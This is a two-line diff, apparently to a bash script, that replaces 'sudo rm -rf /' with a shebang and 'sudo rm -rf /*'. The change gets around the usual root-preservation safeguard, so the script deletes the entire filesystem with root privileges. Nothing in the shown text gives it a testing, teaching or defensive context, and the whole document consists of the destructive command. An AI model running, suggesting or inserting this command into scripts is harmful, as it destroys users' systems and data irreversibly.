@@ -1,1 +1,2 @@
-sudo rm -rf /
+#!/bin/bash
+sudo rm -rf /*
